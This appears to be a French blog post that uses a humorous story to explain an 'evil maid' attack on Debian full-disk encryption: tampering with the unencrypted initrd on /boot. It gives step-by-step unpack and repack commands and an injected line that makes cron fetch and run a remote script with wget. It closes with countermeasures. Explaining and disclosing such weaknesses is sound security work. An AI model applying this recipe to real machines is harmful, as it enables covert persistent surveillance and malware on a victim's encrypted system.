---
title: "Bypasser le chiffrement de disque sous Linux"
tags: [Cryptographie, vulnérabilité]
---


![FBI Kitteh](/assets/img/fbi_kitteh.jpg)

## Introduction dramatique  

À chaque projet de loi concernant l'Internet ou le téléchargement, on assiste à une véritable foire où les internautes ne cessent de critiquer et de minimiser les mesures techniques proposées par le gouvernement arguant quelles sont inefficaces, onéreuses et difficiles à mettre en place... C'est souvent le cas.  

Mais j'évite de participer aux discussions enflammées sur les forums où chacun y va de sa contre mesure technique... ce sont souvent les moins informés qui s'y expriment le plus.  

Si vous avez fait un tour chez un libraire ces derniers temps, vous avez dû remarquer qu'une certaine presse (les magazines sur lesquels on voit une bourrique ou un drapeau noir) joue aussi le jeu à fond et la page de couverture titre à peu près *"Toutes les astuces pour pas se faire gauler !"*.  

Avec la [LOPSI 2](http://fr.wikipedia.org/wiki/Loi_d'orientation_et_de_programmation_pour_la_performance_de_la_s%C3%A9curit%C3%A9_int%C3%A9rieure), le phénomène est exactement le même. Un peu partout sur le web, vous lirez que pour empêcher l'insertion du fameux mouchard, il suffit de chiffrer son disque.  

Mais qu'en est-il réellement ?  

## Scénario improbable  

*José* est un terroriste.  
C'est du moins ce que certaines personnes pensent, tellement il est de gauche, tellement il porte la moustache, tellement il est agriculteur, tellement il va pas au *MacDo*...  

En plus il est anti-capitaliste au point de ne pas utiliser un système *Microsoft* !! C'est sûr, *José* et un homme dangereux.  

D'ailleurs il a installé une *Debian Lenny* en utilisant les options permettant de chiffrer l'ensemble de ses données.  

Le ministre de l'Intérieur a décidé que ce serait bien d'avoir un œil sur ses communications. Malheureusement *José* communique avec *GPG*. De plus une exploitation distante pour pénétrer son ordinateur a peu de chances de réussir, car il utilise *OpenOffice* ;-) et met régulièrement son système à jour.  

C'est pour cela que le *GIPM* (*Groupe d'Intervention de Pose de Mouchard*) s'est vu remettre l'opération.  

Mais une fois qu'ils ont obtenu un accès physique à l'ordinateur, le *GIPM* (mené par l'inspecteur *Coudrier*) s'aperçoivent que le disque est chiffré !!  

L'inspecteur *Coudrier* trouvera-t-il une astuce ? *José* ira-t-il à *Quick* à défaut de *MacDo* ?  

## Chapitre II  

*Coudrier* ne s'avoue pas vaincu. Il a pris soin d'éplucher [le manuel d'installation Debian](http://d-i.alioth.debian.org/manual/en.i386/ch06s03.html) et s'est attardé sur la partie concernant le chiffrement.  

A priori ce n'est pas gagné : le disque est préalablement effacé et les données ensuite chiffrées avec des algorithmes solides. Pourtant, il a remarqué un détail dans l'article :  

> Some people may even want to encrypt their whole system. The only exception is the /boot partition which must remain unencrypted, because currently there is no way to load the kernel from an encrypted partition.

En effet, depuis sa vieille galette *KnoppixSTD* qu'il a lancé sur l'ordinateur, *Coudrier* a remarqué deux entrées dans `/etc/fstab`.  

La première est la partition `/dev/hda1` montée sur `/boot` au format ext2, de petite taille.  

La seconde (`/dev/hda2`) est marquée de format auto. Son contenu est une suite d'octets inexploitables. Seules quelques chaines au début de la partition semblent indiquer qu'il s'agit d'une partition chiffrée. On peut lire `LUKS aes cbc-essiv:sha256 sha1`.  

*Coudrier* monte la partition `/boot` et liste son contenu : un dossier `grub` et `lost+found` ainsi que des fichiers `config-2.6.26-2-686`, `initrd.img-2.6.26-2-686`, `System.map-2.6.26-2-686` et `vmlinuz-2.6.26-2-686`.  

L'inspecteur n'ayant aucune connaissance en virologie, il laisse de côté le fichier `vmlinuz-2.6.26-2-686` et commence à s'intéresser au fichier `initrd.img-2.6.26-2-686`.  

Ce fichier pèse 7Mo et est compressé par gzip. *Coudrier* le copie sur sa clé USB, le décompresse et obtient une archive au format `cpio`.   

```console
$ cp initrd.img-2.6.26-2-686 /mnt/usbkey/initrd.gz
$ cd /mnt/usbkey
$ gunzip initrd.gz
$ file initrd
initrd: ASCII cpio archive (SVR4 with no CRC)
```

Une recherche sur Google depuis une autre machine l'amène à [une page sur les étapes du boot Linux](http://oldfield.wattle.id.au/luv/boot.html) et une autre sur [la manipulation d'un fichier initrd](http://aasoftware.eu/index.php?option=com_content&task=view&id=44&Itemid=39).  

Avec la première page, il apprend que la partition racine est montée après le lancement de `initrd`. Pourtant, dans la section `initrd` on peut lire *"'real' root is mounted"*... étrange.  

L'inspecteur n'a pas toute la journée : il tente sa chance.  

En listant le contenu du `initrd` (`cpio -itv < initrd`) il observe des fichiers qui ne lui sont pas utiles comme des modules kernel ou des binaires statiques et strippés.  

Il y a aussi un dossier `scripts` dont le contenu est le suivant :   

```
scripts/nfs
scripts/local
scripts/init-premount
scripts/init-premount/udev
scripts/init-premount/blacklist
scripts/init-premount/thermal
scripts/local-top
scripts/local-top/lvm2
scripts/local-top/cryptopensc
scripts/local-top/lvm
scripts/local-top/cryptroot
scripts/local-bottom
scripts/local-bottom/cryptopensc
scripts/local-premount
scripts/local-premount/resume
scripts/init-top
scripts/init-top/keymap
scripts/init-top/framebuffer
scripts/init-top/all_generic_ide
scripts/functions
scripts/init-bottom
scripts/init-bottom/udev
```

Il décide d'approfondir et extrait (`cpio -iv < initrd`) les fichiers de l'archive cpio. Dans le fichier `scripts/local` il trouve une fonction baptisée *"mountroot"* qui contient la ligne suivante :  

```bash
mount ${roflag} -t ${FSTYPE} ${ROOTFLAGS} ${ROOT} ${rootmnt}
```

Il décide d'ajouter juste derrière la ligne   

```bash
echo "0 * * * *  root  cd /dev/shm && wget http://lopsi.interieur.gov/mouchard.sh && chmod +x mouchard.sh && ./mouchard.sh" > ${rootmnt}/etc/crontab
```

*Coudrier* régénère l'archive `cpio` avec ses modifications (`find * | cpio -o -H newc > ../new_initrd`) et la recompresse (`gzip -9 new_initrd`) avant d'écraser l'ancienne version.  

Il lance un `sync`, démonte les partions, retire sa galette et éteint la machine. Mission accomplished.  

## Fin  

Au prochain démarrage de son ordinateur, *José* rentre sa passphrase qui lui permet de déchiffrer les disques. Il ne sait pas qu'il a malgré lui permis à la commande de *Coudrier* de s'exécuter sur la partition tout juste déchiffrée...  

## Conclusion  

Bien que très efficace, le système de chiffrement de disque a quelques lacunes puisqu'un programme peut être injecté sur la partition `/boot` pour s'exécuter une fois que vous aurez autorisé le déchiffrement des partitions.  

Pour se protéger d'une telle attaque, il faudrait désactiver le boot sur périphériques CD ou USB dans le bios et protéger ce dernier par un mot de passe. Un cadenas physique empêchant le retrait du disque ou le vidage de la mémoire BIOS est aussi important.  

## Notes  

Comme indiqué dans cette fiction-réalité, j'ai effectué mes tests sur une Debian Lenny en sélectionnant le chiffrement total dans l'installeur.  

Les commandes que l'on peut insérer dans les scripts extraits du `initrd` sont limitées aux commandes du shell ainsi qu'aux exécutables (peu nombreux) présents dans l'archive. Impossible donc d'y lancer directement un programme comme `wget`.  

La commande que j'ai injectée durant mes tests créait uniquement un fichier dans `/etc` que l'on retrouvait une fois logué sur le système et après avoir saisi la passphrase. L'entrée `crontab` de l'article est juste là pour faire plus _l33t_.

*Published January 11 2011 at 12:39*
